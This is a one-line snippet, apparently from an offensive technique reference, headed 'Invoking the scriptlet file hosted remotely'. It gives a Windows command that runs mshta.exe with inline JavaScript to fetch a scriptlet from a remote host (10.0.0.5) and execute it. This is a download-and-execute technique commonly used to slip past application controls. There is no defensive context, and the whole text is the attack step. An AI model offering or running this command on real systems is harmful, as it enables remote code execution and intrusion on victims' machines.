Invoking the scriptlet file hosted remotely
```
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/file.sct")).Exec();close();
```
